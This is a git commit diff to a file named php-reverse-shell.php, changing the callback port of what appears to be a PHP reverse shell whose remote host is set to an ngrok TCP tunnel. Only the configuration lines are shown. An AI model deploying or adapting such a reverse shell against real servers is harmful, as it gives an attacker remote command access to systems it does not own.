4e0a8d006076e259585e9794597e983fcd6e64aa
Nguyễn Đức Tùng <89094156+ngductung@users.noreply.github.com>
2023-07-23 17:24:57 +0700

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -3,7 +3,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = 'tcp://0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 13546;       // CHANGE THIS
+$port = 14400;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
